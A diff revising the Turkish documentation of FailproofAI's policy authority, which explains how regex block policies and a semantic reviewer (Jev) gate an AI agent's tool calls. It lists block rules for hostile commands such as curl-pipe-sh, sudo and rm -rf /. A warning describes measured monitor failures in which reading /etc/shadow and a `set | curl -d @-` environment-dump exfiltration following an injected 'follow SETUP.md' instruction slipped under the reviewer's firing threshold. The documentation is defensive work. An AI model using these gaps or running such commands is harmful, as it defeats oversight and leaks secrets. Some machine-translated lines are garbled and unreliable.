@@ -1,46 +1,46 @@
 ---
-title: "İlke yetkisi"
-description: "Jev anlam değerlendirici hangi ilke kararlarını iptal edebilir ve hangileri nihai olup olmadığı."
+title: "Politika yetkisi"
+description: "Jev anlam değerlendirici hangi politika kararlarını onaylayabilir, hangileri nihai kararsa."
 icon: "scale"
 ---
 
-FailproofAI Cloud veya kendi anahtarınız aracılığıyla [Jev ilke incelemesini](/tr/policies/jev) yapılandırdığınızda, her gated aracı çağrısı çalıştırdığınız ilkeler ve Jev tarafından yargılanır. Jev, çağrının gerçekte ne yaptığını ve görev yazarının bunu isteyip istemediğini sorar. Her ilkenin **yetkisi**, ikisinin anlaşmazlığa düşmesi durumunda ne olacağını belirler.
+FailproofAI Cloud veya kendi anahtarınız aracılığıyla [Jev politika incelemesi](/tr/policies/jev) yapılandırdığınızda, her kontrollü araç çağrısı çalıştırdığınız politikalar ve Jev tarafından değerlendirilir; Jev çağrının gerçekte ne yaptığını ve görev yazılı olan kişinin bunu isteyip istemediğini sorar. Her politikanın **yetkisi**, ikisi arasında anlaşmazlık olduğunda ne olacağını belirler.
 
-Jev yapılandırılmadan, yetkinin hiçbir etkisi yoktur. Her ilke tam olarak her zaman yaptığı gibi uygulanır.
+Jev yapılandırılmadığında, yetki hiçbir etkiye sahip değildir. Her politika her zaman olduğu gibi tam olarak uygulanır.
 
 ## Sert ve incelenebilir
 
-- **Sert** varsayılan ayardır. Sert bir ilkenin deny veya instruction kararı nihai olur: Jev onu iptal edemez ve sert bir deny çağrıyı Jev'i beklemeden durdurur.
-- **İncelenebilir**, Jev'in ilkenin kararını iptal edebilir anlamına gelir, ancak yalnızca ilkenin `reviewedBy` alanında adlandırdığı anlam kontrolleri aracılığıyla. Karar, **her** adlı kontrol bu çağrı hakkında sorgulandığında ve her birinin ya hiçbir şey bulunmadığı ya da kullanıcının bunu istediğini kaydettikleri zaman açılır. **Tetiklenen** bir kontrol — endişeyi bulan — kullanıcı bunu istemeden, kendi kararı yalnızca bir uyarı olsa bile bloğu tuttuğu zaman açılır. Jev'e sorulmayan bir kontrol, o araca uygulanmadığı için asla hiçbir şeyi açmaz, diğerleri ne desinler. Bir yumuşatma onayı sayılır: çağrı, kullanıcının verdiği görevin bir adımı olduğunda ve daha ileri gitmediğinde, Jev bir deny'yi uyarıya dönüştürür ve bu uyarı ilkenin bloğunu kaldırır ve aracıya söylenen budur.
+- **Sert** varsayılandır. Sert bir politikanın reddi veya talimatı nihaidir: Jev bunu onaylayamaz ve sert bir ret, çağrıyı Jev'i beklemeden durdurur.
+- **İncelenebilir**, Jev'in politikanın kararını onaylayabileceği anlamına gelir, ancak yalnızca `reviewedBy` içinde politikanın adlandırdığı anlam kontrolleri aracılığıyla. Karar yalnızca **her** adlandırılan kontrol bu çağrı hakkında sorulduğunda ve her biri hiçbir şey bulunmadığını ya da kullanıcının bunu istediğini kaydettiklerinde temizlenir. **Tetiklenen** bir kontrol — endişeyi bulan — kullanıcı bunu istemeden, kendi kararı yalnızca bir uyarı olsa bile bloku tutar. Jev'in sorulmadığı bir kontrol, çünkü söz konusu araca uygulanmaz, ne söyledikleri olursa olsun hiçbir şeyi temizlemez. Bir yumuşatma onay olarak sayılır: çağrı kullanıcının verdiği görevin bir adımıysa ve daha ileri gitmezse, Jev bir reddini uyarıya çevirir ve bu uyarı politikanın bloğunu temizler ve aracıya söylenendir.
 
-Bir ilke yalnızca aşağıdakilerin tümü doğru olduğunda incelenebilir:
+Bir politika yalnızca tüm bunlar geçerli olduğunda incelenebilir:
 
 1. `authority: "reviewable"` bildirir.
-2. `reviewedBy` boş olmayan bir liste olup, her giriş yüklü bir paket tarafından bildirilen bir Jev kontrolüdür. Failproof AI Jev kontrolleri göndermez: [aşağıdaki on altı](#semantic-policy-names) `failproofai policies add FailproofAI/jev-policies` komutundan gelir. Kontrolleri bildiren paket olmadan, her ilke serttir.
-3. `alwaysOn` değildir. Failproof AI'yi devre dışı bırakan bir aracıyı durduran koruma her zaman serttir.
+2. `reviewedBy` boş olmayan bir listedir ve her girdi yüklü bir pakerin bildirdiği Jev kontrolüdür. FailproofAI Jev kontrolleri göndermez: [aşağıdaki on altı](#semantic-policy-names) `failproofai policies add FailproofAI/jev-policies` komutundan gelir. Hiçbir paket kontrol bildirmezse, her politika serttir.
+3. `alwaysOn` değildir. Bir aracıyı FailproofAI'yi devre dışı bırakmaktan koruyan koruma her zaman serttir.
 
-Diğer her şey serttir: eksik alan, yanlış yazılan değer, boş veya hatalı biçimlendirilmiş `reviewedBy` veya bu makinenin sorabileceği bir kontrol olmayan bir ad. Bilinmeyen bir ad, `reviewedBy` anlamına geldiği için tüm bildirimi sert yapar: "bunların hepsi sorulmalı ve hiçbiri deny yapmamalı", ve bir adı atlamak Jev'in ilkeyi sorduğunuzdan daha az kontrol üzerinde açmasına izin verirdi.
+Diğer her şey serttir: eksik alan, yanlış hecelenmiş değer, boş veya hatalı biçimlendirilmiş `reviewedBy`, veya bu makinenin sorabileceği bir kontrol olmayan adı. Bilinmeyen bir ad, tüm bildirimi sert yapar, atlanmaz; çünkü `reviewedBy` "bunların hepsi sorulmalı ve hiçbiri reddedemez" anlamına gelir ve bir adı atlamak Jev'in politikayı sorduğunuzdan daha az kontrollere dayanarak temizlemesine izin verirdi.
 
-Jev yapılandırıldıktan sonra, Failproof AI, `reviewable` bildirimi reddettiğinde, işlem başına bir kez uyarı kaydeder. Jev olmadan sessiz kalır, çünkü yetkinin bir etkisi olmaz. `failproofai publish`, böyle bir bildirimi taşıyan bir paket oluşturmayı reddeder, bu nedenle paket yazarı herhangi biri onu kurmadan önce bunu öğrenir. `reviewedBy`'yi, paketin bildirdiği kontrollere karşı jüri tarafından yargılar (eğer herhangi birini bildirirse) ve aksi takdirde on altı `FailproofAI/jev-policies` adına karşı.
+Jev yapılandırıldıktan sonra, FailproofAI bir `reviewable` bildirimi reddettiğinde, işlem başına bir kez uyarı kaydeder. Jev olmadan sessiz kalır, çünkü yetki o zaman hiçbir şeyi belirlemez. `failproofai publish` böyle bir bildirimi taşıyan bir paket oluşturmasını reddeder, bu nedenle paket yazarı biri kurmadan önce öğrenir. `reviewedBy` kontrolleri paketi bildirdiğinde paketten bildirdikleri kontrollere, aksi takdirde on altı `FailproofAI/jev-policies` adına karşı değerlendirir.
 
-## Yetkinin bildirildiği yer
+## Yetki nerede bildirilir
 
-Bir ilkenin bir makineye ulaşmanın her yolu, yetkisine karar veren bir yere sahiptir:
+Bir politikanın makineye ulaşmasının her yolu, yetki belirleyen bir yere sahiptir:
 
-| Kaynak | Bildirildiği yer | Varsayılan |
+| Kaynak | Bildirildiği Yer | Varsayılan |
 | --- | --- | --- |
-| Yerleşik ilkeler | Aşağıdaki tablo | İncelenebilir olarak listelenmediği sürece Sert |
-| Kendi ilke dosyalarınız | `customPolicies.add` üzerinde `authority` ve `reviewedBy` | Sert |
-| İlke paketleri | Paket manifestinde her ilkenin girişi (`failproofai-pack.json`) | Sert |
-| Bulut tarafından yönetilen ilkeler | Etkin dağıtımda ilkenin ataması | Sert. Dağıtımlar henüz bu ayarı yapmıyor, bu nedenle bugün her bulut tarafından yönetilen ilke serttir. |
+| Yerleşik politikalar | Aşağıdaki tablo | İncelenebilir olarak listelenmediği sürece Sert |
+| Kendi politika dosyalarınız | `customPolicies.add` üzerinde `authority` ve `reviewedBy` | Sert |
+| Politika paketleri | Paket manifestinde her politikanın girişi (`failproofai-pack.json`) | Sert |
+| Bulut yönetimli politikalar | Politikanın etkin dağıtımdaki ataması | Sert. Dağıtımlar henüz ayarlamadığından, her bulut yönetimli politika bugün serttir. |
 
-Paket veya bulut tarafından yönetilen ilke için, ilke kodunun içinde ayarlanan alanlar yoksayılır; manifest veya atama karar verir. Bir paket yalnızca kendi ilkelerini tanımlayabilir: ilke adları `/` içeremez ve paketin kendi ön eki altında kaydedilir, bu nedenle hiçbir manifest bir yerleşik ilkeyi veya başka bir paketin ilkesini incelenebilir olarak işaretleyemez. Bir paket tarafından, manifeste bildirmeden kaydedilen ilke serttir.
+Paket veya bulut yönetimli politika için, politika kodunun içinde ayarlanan alanlar yoksayılır; manifest veya atama belirler. Bir paket yalnızca kendi politikalarını tanımlayabilir: politika adları `/` içeremez ve paketin kendi öneki altında kaydedilir, bu nedenle hiçbir manifest bir yerleşik politikayı veya başka bir paketin politikasını incelenebilir olarak işaretleyemez. Bir paketin kodu bir politikayı manifestte bildirmeden kaydederse, serttir.
 
-Kodu byte-tanımlı olan iki paket veya iki bulut tarafından yönetilen ilke bir yapıyı paylaşır ve tek bir ilke olarak yüklenir. Bu ilke yalnızca hepsinin onu incelenebilir olarak bildirmesi durumunda incelenebilir olup, Jev daha sonra her birinin adlandırdığı her kontrolü açmalıdır. Herhangi biri onu sert olarak bildirirse veya hiç bildirmezse, sert kalır. Paketler veya ilkelerin listelenme sırası asla önemli değildir.
+Kodu byte ile aynı olan iki paket veya iki bulut yönetimli politika bir yapı paylaşır ve bir politika olarak yüklenir. Bu politika yalnızca her biri incelenebilir olarak bildirirse incelenebilir ve Jev daha sonra her birinin adlandırdığı her kontrolü temizlemelidir. Herhangi biri serttir olarak bildirirse veya hiç bildirmezse, serttir kalır. Paketlerin veya politikaların listede yer alma sırası asla önemli değildir.
 
-Çoğu makine, `FailproofAI/policies` paketinden yerleşik ilkeleri alır ve yetkisini o paketin manifestinden okur. Aşağıdaki incelenebilir girişler, onları taşıyan paketin bir sürümü yüklendikten sonra yürürlüğe girer; eski bir sürüm hiçbirini taşımaz, bu nedenle içindeki her ilke sert kalır.
+Çoğu makine yerleşik politikaları `FailproofAI/policies` paketinden alır ve yetki yetkisini o paketin manifestinden okur. Aşağıdaki incelenebilir girişler, onları taşıyan paketin bir sürümü yüklendikten sonra geçerli olur; eski bir sürüm hiçbirini taşımaz, bu nedenle içindeki her politika serttir kalır.
 
-## Kendi ilkenizde yetkiyi bildirin
+## Kendi politikanızda yetki bildirin
 
 ```js
 import { customPolicies, deny, allow } from "failproofai";
@@ -58,87 +58,87 @@ customPolicies.add({
 });
 ```
 
-`failproofai publish`, her iki alanı paket manifestine kopyalar, bu nedenle paket olarak yayınlanan bir ilke yazarının verdiği yetkiyi korur. Bildirim onaylanmayacak olacaksa paketi oluşturmayı reddeder: `"hard"` veya `"reviewable"` dışında bir değer, liste olmayan `reviewedBy` veya bir kontrol olmayan bir ad — paketin kendi [Jev kontrolleri](/tr/policies/publish-a-pack#jev-checks-in-a-pack) (herhangi birini bildirirse) ya da aksi takdirde yerleşik bir kontrol.
+`failproofai publish` her iki alanı paket manifestine kopyalar, bu nedenle paket olarak yayımlanan bir politika, yazarının verdiği yetkiyi tutar. Bildirim onurlandırılamayacaksa paket oluşturmayı reddeder: `"hard"` veya `"reviewable"` dışında bir değer, liste olmayan `reviewedBy`, veya kontrol olmayan bir ad — paketin kendi [Jev kontrolleri](/tr/policies/publish-a-pack#jev-checks-in-a-pack) herhangi bir bildirdiğinde, aksi takdirde yerleşik bir kontrol.
 
-## Yerleşik ilkeler
+## Yerleşik politikalar
 
-Yalnızca bir anlam kontrolü gerçekten aynı endişeyi kapsadığı yerlerde incelenebilir. Diğer her yerleşik ilke serttir.
+Yalnızca bir anlam kontrolü gerçekten aynı endişeyi kapsadığı yerde incelenebilir. Diğer her yerleşik politika serttir.
 
-Endişeyi kapsamak gerekli fakat yeterli değildir ve her iki yanlış gitme şekli de sessizdir:
+Endişeyi kapsamak gerekli ancak yeterli değildir ve her iki yanlış yapmanın yolu da sessizdir:
 
-- **Asla sorulmayan bir kontrol** bloğu kalıcı yapar. `reviewedBy` bir konjunksiyondur ve sorulmayan bir kontrol asla açılmaz, bu nedenle ilkenin eşleştiği şekillere yönelik ön koşulu ateşlemeyen bir kontrolle eşleştirilmiş ilke hiç açılamaz.
-- **Sorulan fakat ateşlemeyen bir kontrol** "endişe yok" cevap verir ve hiçbir endişe açılmaz. Bu nedenle ilkenizin şekillerini modellemeyerek bir kontrolle eşleştirmek, ilkeyi incelemez — tam olarak kontrolün anlamadığı girişleri kapatır.
+- **Asla sorulamayan bir kontrol**, bloku kalıcı yapar. `reviewedBy` bir birleştirmedir ve sorulamayan bir kontrol asla temizlemez, bu nedenle ön koşulu politikanın eşleştirdiği şekiller için tetiklenmeyen bir kontrolle eşleştirilmiş bir politika asla hiç temizlenemez.
+- **Sorulan ancak tetiklenmeyen bir kontrol**, "endişe yok" cevabı verir ve endişe yok temizler. Bu nedenle politika şekilleri modellemeyeri bir kontrolle eşleştirmek, politikayı incelemez — kontrol anlamadığı tam girişlerde onu kapatır.
 
-Instruct modu anlam ilkesi asla deny veremez, fakat yine de bloğu tutabilir: ateşlendiğinde ve kullanıcı çağrıyı istemediğinde, incelediği ilke açılmaz. `FailproofAI/jev-policies` kontrolleri arasında altısı yalnızca instruct'tır — `push-to-protected-branch`, `commit-on-protected-branch`, `read-outside-workspace`, `system-modification`, `env-secrets-dump` ve `external-data-egress` — ve [aşağıdaki tablo](#semantic-policy-names) her kontrolün modunu verir. Sorunması gereken soru **"deny yapabilecek başka bir şey kaldı mı"**: bir açılış endişeyi hiçbir şey tarafından uygulanmayan bırakmamalı. Motor bunu çağrı başına uygular. Hiç kimsenin onaylamadığı bir uyarı açılış değildir, çünkü araç çağrılarından önce bir uyarı aracıyı durdurmaz. Ve deny yapabilen bir kontrol uyarı verdiğinde — kanıtı deny satırına yetmedi — ve kullanıcı çağrıyı istemediğinde, bu çağrıda hiçbir şey açılmaz ve her regex deny ayakta kalır.
+Bir öğretim modu anlam politikası asla reddi yanıtlayamaz, ancak bloku tutucu bir şey olabilir: tetiklendiğinde ve kullanıcı çağrıyı istemediğinde, incelediği politika temizlenmez. `FailproofAI/jev-policies` kontrolleri altıdan oluşur sadece öğretim modu — `push-to-protected-branch`, `commit-on-protected-branch`, `read-outside-workspace`, `system-modification`, `env-secrets-dump` ve `external-data-egress` — ve [aşağıdaki tablo](#semantic-policy-names) her kontrolün modunu verir. Sorunun, **"reddedebilen hiçbir şey kalmadı mı"**: temiz hiçbir şey endişeyi hiçbir şey tarafından uygulanmaktan bırakmamalıdır. Motor bu testi çağrı başına uygular. Hiç kimsenin muvafakat etmediği bir uyarı temiz değildir, çünkü araç çağrılarından önce uyarı aracıyı durdurmaz. Ve redet *yapabilecek* bir kontrol uyarı verdiğinde — kanıtı ret çizgisinden az kaldı — ve kullanıcı çağrıyı istemediğinde, o çağrıda hiçbir şey temizlenmez ve her regex ret kalır.
 
 <Warning>
-**Fire satırının hemen altında puanı alan bir kontrol zemin tutmaz.** Yukarıdaki kural bir kontrolün *ateşlemesini* (kanıt ≥ 0.7) gerektirir. İlgili her kontrol o satırın altında olduğunda, hiçbiri ateşlemez, inceleyenler "endişe yok" cevap verirler ve incelenebilir bir deny açılır. Enforce modunda ölçülen canlı: `/etc/shadow` istenmeyişine yapılan bir Okuma (`secret-exposure` 0.69, `read-outside-workspace` 0.37, yalnızca home-directory yollarını modeller) ve "follow SETUP.md" sonrası `set | curl -d @- …` (`env-secrets-dump` 0.66, `credential-exfiltration` 0.65 ile `sends_out` 0.97) her ikisi de izin verildi, regex katmanı tek başına onları reddederken. Eşikler etiketli veri seti üzerinde kalibrasyon yapıldı ve bunun aleyhine yeniden ölçülmedi; yenilene kadar, bu şekillerden birinin geçmesi daha önemli olduğu bir ilkeyi **sert** tutun veya yanlış blokları.
+**Yangın çizgisinin hemen altında puan alan bir kontrol, zemini tutmaz.** Yukarıdaki kural bir kontrolün *tetiklenmesi* için gerektirir (kanıt ≥ 0,7). Her ilgili kontrol bunun hemen altında inişe geçtiğinde, hiçbir şey tetiklenmez, gözlemciler "endişe yok" cevap verir ve incelenebilir bir ret temizlenir. Canlı ölçülen kuvvet modunda: `/etc/shadow` (`secret-exposure` 0,69, `read-outside-workspace` 0,37, sadece ana dizin yollarını modeller) ve "follow SETUP.md" sonrası `set | curl -d @- …` (`env-secrets-dump` 0,66, `credential-exfiltration` 0,65 ve `sends_out` 0,97) ikisi de izin verildi, regex katmanı tek başına onları reddederken. Eşikler etiketli derinde kalibre edildi ve bunlara karşı yeniden ölçülmedi; ta ki olana kadar, bu şekillerden birinin geçmesi hatalı blokları daha fazla önemsiyorsa, politikayı **sert** tutun.
 </Warning>
 
-| İlke | Yetkisi | İncelenen | Sebep |
+| Politika | Yetki | İncelenen | Neden |
 | --- | --- | --- | --- |
-| `protect-env-vars` | incelenebilir | `env-secrets-dump`, `secret-exposure` | Desen herhangi bir değişken referansına ateşlenir; Jev gizli değerlerin gerçekten yazdırılıp yazdırılmayacağını sorar. |
-| `block-env-files` | incelenebilir | `secret-exposure` | Desen herhangi bir `.env` yolunu eşleştirir, şablonlar dahil; Jev gerçek gizli değerlerin okunup yazılıp yazılmadığını sorar. |
-| `block-read-outside-cwd` | incelenebilir | `read-outside-workspace` | Gerçek trafikte gürültülü olarak ölçüldü; Jev proje dışında dosya içeriğinin okunup okunmadığını sorar. Kullanıcının istediği okuma veya kontrolün hiçbir şey bulmadığı okuma açılır; ateşlediği istenmeyişi okuma bloğu tuttuğu zaman. |
-| `warn-git-amend` | incelenebilir | `git-history-rewrite` | İtilmeyen bir commit'i düzenlemek sıradan; zarar, diğerleri çekmiş olabilecek tarihi yeniden yazmaktır. |
-| `warn-destructive-sql` | incelenebilir | `database-destruction` | Jev ayrıca hedefin gerçek bir veritabanı mı yoksa tek kullanımlık bir test mi olduğunu sorar. |
-| `warn-global-package-install` | incelenebilir | `system-modification` | Aynı endişe: makinenin dışında değişiklik yapmak proje. |
-| `block-failproofai-commands` | sert | | `alwaysOn` öz-koruma. Asla incelenebilir değildir. |
-| `block-rm-rf` | incelenebilir | `destructive-deletion` | Yol derinliği buluşsal yöntemi `rm -rf node_modules` yanlış alır; Jev yok edilecek şeyin yeniden oluşturulabilir olup olmadığını sorar. `rm -rf /` her iki probayı da tuttuğu zaman. |
-| `block-sudo` | sert | | Ayrıcalık yükseltme. |
+| `protect-env-vars` | incelenebilir | `env-secrets-dump`, `secret-exposure` | Desen herhangi bir değişken referansına tetiklenir; Jev gizli değerlerin aslında yazdırılıp yazdırılmayacağını sorar. |
+| `block-env-files` | incelenebilir | `secret-exposure` | Desen herhangi bir `.env` yolunu eşleştirir, şablonlar dahil; Jev gerçek gizli değerlerin okunup yazılıp yazılmayacağını sorar. |
+| `block-read-outside-cwd` | incelenebilir | `read-outside-workspace` | Gerçek trafikte gürültülü olarak ölçüldü; Jev proje dışındaki dosya içeriklerinin okunup okunmadığını sorar. Kullanıcının istediği okuma veya kontrolün hiçbir şey bulduğu bir okuma temizlenir; istenmeyeri okuma temizliyor işareti bloku tutar. |
+| `warn-git-amend` | incelenebilir | `git-history-rewrite` | İtilmeyen bir commiti değiştirmek sıradan; zarar, diğerlerin çekmesi olabilecek tarihini yeniden yazmaktır. |
+| `warn-destructive-sql` | incelenebilir | `database-destruction` | Jev ayrıca hedefin gerçek bir veritabanı mı yoksa tek kullanımlık bir test yoksa olduğunu sorar. |
+| `warn-global-package-install` | incelenebilir | `system-modification` | Aynı endişe: makinayı proje dışında değiştirmek. |
+| `block-failproofai-commands` | sert | | `alwaysOn` öz koruma. Asla incelenebilir değildir. |
+| `block-rm-rf` | incelenebilir | `destructive-deletion` | Yol derinliği buluşsal `rm -rf node_modules` yanlış alır; Jev yok edilecek şeyin üretilebilir olup olmadığını sorar. `rm -rf /` her iki probesini doğru tutar. |
+| `block-sudo` | sert | | Ayrıcalık ilerlemesi. |
 | `block-curl-pipe-sh` | sert | | İnternetten indirilen kodu çalıştırır. |
-| `block-push-master` | sert | | Korunan branşe doğrudan iter. |
-| `block-work-on-main` | sert | | `commit-on-protected-branch` tam olarak bu endişeyi kapsar ancak instruct modudur, bu nedenle asla deny veremez ve başka hiçbir kontrol bunu kapsamaz. |
-| `block-force-push` | incelenebilir | `git-history-rewrite` | Jev'in probası matcherin üst kümesidir ve `--force-with-lease`'yi sayar; açılan kısım kendi şubenizi zorla itMemektir. |
-| `block-secrets-write` | incelenebilir | `secret-exposure` | Yol eşleşmesi tutturulmamış, bu nedenle `src/auth/credentials.ts` yakalanır; Jev gerçek anahtar materyalinin yazılıp yazılmadığını sorar. |
-| `block-kubectl` | incelenebilir | `production-infra-change` | Tüm CLI'yi reddeder, salt okunur alt komutları dahil; Jev çağrının mutate edilip edilmediğini ve hedefin prodüksiyon olup olmadığını sorar. |
-| `block-terraform` | incelenebilir | `production-infra-change` | Aynı: `terraform plan` ve `validate` açılır. |
-| `block-aws-cli` | incelenebilir | `production-infra-change` | Aynı: `aws s3 ls`, `aws sts get-caller-identity` açılır. |
-| `block-gcloud` | incelenebilir | `production-infra-change` | Aynı: `gcloud auth list`, `gcloud config list` açılır. |
-| `block-az-cli` | incelenebilir | `production-infra-change` | Aynı: `az account show` açılır. |
-| `block-helm` | incelenebilir | `production-infra-change` | Aynı: `helm list`, `helm status` açılır. |
-| `block-gh-pipeline` | sert | | İş akışlarını, birleştirmeleri ve gizli değişiklikleri tetikler. |
-| `warn-git-stash-drop` | sert | | Hiçbir anlam kontrolü stashed çalışmayı atma konusunu kapsamaz. |
-| `warn-git-clean` | sert | | `destructive-deletion` endişeyi kapsar ancak tanıtımla başarısız olamaz: `git clean` hiçbir yol adlandırmaz, bu nedenle onun `irreplaceable` probu yargılanacak hiçbir şeyin olmadığını ve kanıtı politika üzerinden minimum cevapları düşük ve kanıt politika üzerinden minimum. Sorulan ve ateşlemeyen bir kontrol kararı açar, bu nedenle burada eşleştirmek ilkeyi kapatır. |
-| `warn-all-files-staged` | sert | | Hiçbir anlam kontrolü geniş bir `git add` toplamını kapsamaz. |
-| `warn-schema-alteration` | sert | | `database-destruction` veri bırakmayı kapsar, şema değişikliğini değil. |
-| `warn-package-publish` | sert | | Yayımlama geri döndürülemez ve hiçbir anlam kontrolü bunu kapsamaz. |
-| `prefer-package-manager` | sert | | Bir takım kuralı, güvenlik yargısı değil. |
-| `warn-large-file-write` | sert | | Bir boyut eşiği, Jev'in yapabileceği bir yargı değil. |
+| `block-push-master` | sert | | Korumalı bir dala doğrudan iter. |
+| `block-work-on-main` | sert | | `commit-on-protected-branch` tam olarak bu endişeyi kapsar ancak öğretim modudur, bu nedenle asla reddi yanıtlayamaz ve hiçbir başka kontrol bunu kapsamaz. |
+| `block-force-push` | incelenebilir | `git-history-rewrite` | Jev'in probu matcherin bir üst kümesidir ve `--force-with-lease` sayar; temizleyen kendi şubenizi zorla itermektir. |
+| `block-secrets-write` | incelenebilir | `secret-exposure` | Yol eşleşmesi sabitlenmez, bu nedenle `src/auth/credentials.ts` yakalanır; Jev gerçek anahtar materyalinin yazılıp yazılmadığını sorar. |
+| `block-kubectl` | incelenebilir | `production-infra-change` | Tüm CLI'ı reddeder, salt okunur alt komutlar dahil; Jev çağrının mutasyon yapıp yapmadığını ve hedefin üretim olup olmadığını sorar. |
+| `block-terraform` | incelenebilir | `production-infra-change` | Aynı: `terraform plan` ve `validate` temizler. |
+| `block-aws-cli` | incelenebilir | `production-infra-change` | Aynı: `aws s3 ls`, `aws sts get-caller-identity` temizler. |
+| `block-gcloud` | incelenebilir | `production-infra-change` | Aynı: `gcloud auth list`, `gcloud config list` temizler. |
+| `block-az-cli` | incelenebilir | `production-infra-change` | Aynı: `az account show` temizler. |
+| `block-helm` | incelenebilir | `production-infra-change` | Aynı: `helm list`, `helm status` temizler. |
+| `block-gh-pipeline` | sert | | İşlem hatlarını tetikler, birleştirir ve gizli değişiklikleri yapar. |
+| `warn-git-stash-drop` | sert | | Hiçbir anlam kontrolü gizli çalışmayı atıp atmadığını kapsamaz. |
+| `warn-git-clean` | sert | | `destructive-deletion` endişeyi kapsar ancak açıkça tetiklenemez: `git clean` yolu adlandırmaz, bu nedenle `irreplaceable` sondası yargılanacak bir şey bulunmaz ve düşük yanıt verir ve kanıt bir politikanın problarının minimumudur. Sorulan ve tetiklenmeyeri bir kontrol, kararı temizler, bu nedenle eşleştirme burada politikayı kapatır. |
+| `warn-all-files-staged` | sert | | Hiçbir anlam kontrolü geniş bir `git add` neleri seçtiğini kapsamaz. |
+| `warn-schema-alteration` | sert | | `database-destruction` veri bırakmayı kapsar, şemayı değiştirmez. |
+| `warn-package-publish` | sert | | Yayımlama geri alınamaz ve hiçbir anlam kontrolü bunu kapsamaz. |
+| `prefer-package-manager` | sert | | Bir takım konvansiyonu, güvenlik yargısı değildir. |
+| `warn-large-file-write` | sert | | Bir boyut eşiği, Jev'in yapabileceği bir yargı değildir. |
 | `warn-background-process` | sert | | Hiçbir anlam kontrolü ayrılmış işlemleri kapsamaz. |
 | `warn-repeated-tool-calls` | sert | | Çağrıları sayar; Jev saymaz. |
-| `sanitize-jwt` | sert | | Araç çıkışını redaksiyonlar; araç çağrısı kapısı değil. |
-| `sanitize-api-keys` | sert | | Araç çıkışını redaksiyonlar; araç çağrısı kapısı değil. |
-| `sanitize-connection-strings` | sert | | Araç çıkışını redaksiyonlar; araç çağrısı kapısı değil. |
-| `sanitize-private-key-content` | sert | | Araç çıkışını redaksiyonlar; araç çağrısı kapısı değil. |
-| `sanitize-bearer-tokens` | sert | | Araç çıkışını redaksiyonlar; araç çağrısı kapısı değil. |
-| `require-commit-before-stop` | sert | | Oturum tamamlama kapısı, araç çağrısı kapısı değil. |
-| `require-push-before-stop` | sert | | Oturum tamamlama kapısı, araç çağrısı kapısı değil. |
-| `require-pr-before-stop` | sert | | Oturum tamamlama kapısı, araç çağrısı kapısı değil. |
-| `require-no-conflicts-before-stop` | sert | | Oturum tamamlama kapısı, araç çağrısı kapısı değil. |
-| `require-ci-green-before-stop` | sert | | Oturum tamamlama kapısı, araç çağrısı kapısı değil. |
+| `sanitize-jwt` | sert | | Araç çıkışını redakte eder; araç-çağrısı kapısı değildir. |
+| `sanitize-api-keys` | sert | | Araç çıkışını redakte eder; araç-çağrısı kapısı değildir. |
+| `sanitize-connection-strings` | sert | | Araç çıkışını redakte eder; araç-çağrısı kapısı değildir. |
+| `sanitize-private-key-content` | sert | | Araç çıkışını redakte eder; araç-çağrısı kapısı değildir. |
+| `sanitize-bearer-tokens` | sert | | Araç çıkışını redakte eder; araç-çağrısı kapısı değildir. |
+| `require-commit-before-stop` | sert | | Oturum tamamlama kapısı, araç-çağrısı kapısı değildir. |
+| `require-push-before-stop` | sert | | Oturum tamamlama kapısı, araç-çağrısı kapısı değildir. |
+| `require-pr-before-stop` | sert | | Oturum tamamlama kapısı, araç-çağrısı kapısı değildir. |
+| `require-no-conflicts-before-stop` | sert | | Oturum tamamlama kapısı, araç-çağrısı kapısı değildir. |
+| `require-ci-green-before-stop` | sert | | Oturum tamamlama kapısı, araç-çağrısı kapısı değildir. |
 
-## Anlam ilkesi adları
+## Anlam politikası adları
 
-Bunlar `FailproofAI/jev-policies` bildiren kontroller ve `reviewedBy` yüklendikten sonra kabul eden değerlerdir. Failproof AI kendisi hiçbirini göndermez: bu paketi olmadan (veya bu adları bildiren başka bir paket), hiçbirini adlandıran ilke incelenebilir değildir. Her biri, Jev'in önündeki araç çağrısı hakkında cevap verdiği bir kontroldür. **Mod**, bir kontrolün cevap verebileceğidir: bir `deny` kontrol güçlü kanıta karşı bloklar, bir `instruct` kontrol yalnızca uyarır. Her ikisi de bir ilkenin deny'sini tetiklendiğinde ve kullanıcı çağrıyı istemediğinde tuttuğu zaman ayakta tutarlar. **Kullanıcı geçersiz kılabilir** insanın kendi açık talebinin onu açıp açmadığını söyler.
+Bunlar `FailproofAI/jev-policies` bildirdiği kontroller ve `reviewedBy` yüklendikten sonra kabul ettiği değerlerdir. FailproofAI kendisi hiçbirini göndermez: bu paketi (veya başka bu adları bildireni) olmadan, onları adlandıran hiçbir politika incelenebilir değildir. Her biri Jev'in karşısındaki araç çağrısı hakkında cevap verdiği bir kontroldür. **Mode**, bir kontrolün cevap verebileceğidir: bir `deny` kontrol güçlü kanıtta bloke eder, bir `instruct` kontrol sadece uyarır. İkisi de tetiklendiğinde ve kullanıcı çağrıyı istemediğinde bir politikanın reddini tutarlar. **Kullanıcı geçersiz kılabilir** insanın kendi açık talebinin bunu temizleyip temizlemediğini söyler.
 
-Jev tam olarak [Jev kontrolleri](/tr/policies/publish-a-pack#jev-checks-in-a-pack) yüklü paketlerin bildirdiğini sorar ve bunlar `reviewedBy` kabul eden adlardır. İki paketin farklı bildirdiği bir ad hiçbiri için onurlandırılmaz. Bu on altı adından biri FailproofAI deposu olmayan bir paketten bildirilen bu pakette yoksayılır: sürümü asla sorulmaz ve FailproofAI'nin kendi ile yarışmaz, bu nedenle üçüncü taraf bir paket, çekirdek paket ilkelerini açan kontrol olmaz veya bu kontrolleri kapatmaz. Okunmayan paket listesi veya her kontrolü kullanılamaz olan paket, Jev'e soracak hiçbir şey bırakmaz.
+Jev tam olarak [Jev kontrolleri](/tr/policies/publish-a-pack#jev-checks-in-a-pack) yüklü paketlerin bildirdikleri sorar ve bunlar `reviewedBy` kabul ettiği adlardır. İki paketin farklı bildirdiği bir ad, birisi için de onurlandırılmaz. FailproofAI deposu olmayan bir paket tarafından bildirilen bu on altı addan biri o pakette yoksayılır: sürümü asla sorulmaz ve FailproofAI'ninki ile rekabet etmez, bu nedenle bir üçüncü taraf paketi, temel paket politikalarını temizleyen kontrol haline gelmez ya da bu kontrollerden birini kapatır. Okunmayan bir paket listesi veya her kontrolü kullanılamaz olan bir paket, Jev'i soracak hiçbir şey bırakmaz.
 
-| Ad | Mod | Kullanıcı geçersiz kılabilir | Jev ne kontrol eder |
+| Ad | Mode | Kullanıcı geçersiz kılabilir | Jev ne kontrol eder |
 | --- | --- | --- | --- |
-| `destructive-deletion` | deny | evet | Yeniden oluşturulamayan verileri kalıcı olarak silme. |
